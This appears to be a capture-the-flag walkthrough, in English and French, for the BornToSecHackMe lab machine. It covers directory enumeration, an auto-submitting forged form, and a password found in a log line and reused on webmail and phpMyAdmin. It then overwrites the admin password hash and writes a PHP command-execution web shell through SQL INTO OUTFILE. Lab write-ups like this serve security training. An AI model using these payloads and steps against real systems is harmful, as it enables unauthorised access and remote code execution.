# Exploit the Forum

The forum can be access throught this URI: https://192.168.1.139:443/forum/

![img forum](/img/forum.png)

```bash
==> DIRECTORY: https://192.168.1.139:443/forum/

---- Entering directory: https://192.168.1.139:443/forum/ ----
==> DIRECTORY: https://192.168.1.139:443/forum/js/
==> DIRECTORY: https://192.168.1.139:443/forum/includes/
==> DIRECTORY: https://192.168.1.139:443/forum/js/
==> DIRECTORY: https://192.168.1.139:443/forum/lang/
==> DIRECTORY: https://192.168.1.139:443/forum/modules/
==> DIRECTORY: https://192.168.1.139:443/forum/templates_c/
==> DIRECTORY: https://192.168.1.139:443/forum/themes/
==> DIRECTORY: https://192.168.1.139:443/forum/update/
```

All of this directories are listable:

![img listable](/img/index-js.png)

https://192.168.1.139/forum/index.php?mode=register

mode=login&username=test&userpw=""

<form action="https://192.168.1.139/forum/index.php?mode=register" method="POST">
    <input type="hidden" name="username" value="test" />
    <input type="hidden" name="userpw" value="test" />
</form>
<script>
    document.forms[0].submit();
</script>

By reading the lmezard's post, we can't see this line:

```bash
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2the
```

Its seems to be a log, but the users did a mistake by passing his password instead of his username.

```bash
ssh admin@192.168.1.139 -p 22
Permission denied, please try again.
ssh nvdb@192.168.1.139 -p 22
Permission denied, please try again.
ssh adam@192.168.1.139 -p 22
Permission denied, please try again.
ssh guest@192.168.1.139 -p 22
Permission denied, please try again.
ssh lmezard@192.168.1.139 -p 22
Permission denied, please try again.
```

None of thos seems work. So i try with the website: Bingo !

Her personnal informations give us her mailaddress.

https://192.168.1.139:443/webmail/
laurie@borntosec.net !q\]Ej?*5K5cy*AJ mail

mail very interesting from : qudevide@mail.borntosec.net

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
https://192.168.1.139:443/phpmyadmin/

section forum_db on peut voit dans mlf2_userdata qu'on peut edit les users dont leurs mot de passes hached 

manque plus qu'a savoir comment c'est hash, pour ca direction le code src du projet et bingo :

function generate_pw_hash($pw)
 {
  $salt = random_string(10,'0123456789abcdef');
  $salted_hash = sha1($pw.$salt);
  $hash_with_salt = $salted_hash.$salt;
  return $hash_with_salt;
 }

 on le replique en python : 
 python3 -c "import hashlib, random, string; salt = ''.join(random.choice(string.hexdigits) for _ in range(10)); pw = 'admin'; print(hashlib.sha1((pw + salt).encode()).hexdigest() + salt)"

755d3fc8e359cdc8d958882ef0c5b28d608832b436CBA99CCF

on modifie le hash de l'admin et bingo on peut se co avec 
admin admin

SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET["cmd"]) {system($_GET["cmd"]);} ?></pre></BODY></HTML>'
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'

https://192.168.1.139/forum/templates_c/cmd.php